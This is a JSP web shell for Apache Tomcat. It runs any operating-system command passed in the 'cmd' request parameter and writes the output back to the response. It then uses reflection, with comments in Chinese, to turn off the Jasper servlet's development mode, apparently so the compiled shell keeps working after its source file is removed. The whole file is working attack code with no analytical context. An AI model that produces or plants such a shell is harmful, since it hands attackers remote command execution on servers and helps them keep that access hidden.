<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.jasper.EmbeddedServletOptions" %>
<%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = process.getInputStream();
    int a = 0;
    byte[] b = new byte[1024];

    while ((a = in.read(b)) != -1) {
        out.println(new String(b, 0, a));
    }

    in.close();

    //从request对象中获取request属性
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);
    //获取MappingData
    MappingData mappingData = req.getMappingData();
    //获取Wrapper
    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
    //获取jspServlet对象
    Field instanceF = wrapper.getClass().getDeclaredField("instance");
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);
    //获取options中保存的对象
    Field Option = jspServlet.getClass().getDeclaredField("options");
    Option.setAccessible(true);
    EmbeddedServletOptions op = (EmbeddedServletOptions) Option.get(jspServlet);
    //设置development属性为false
    Field Developent = op.getClass().getDeclaredField("development");
    Developent.setAccessible(true);
    Developent.set(op, false);
%>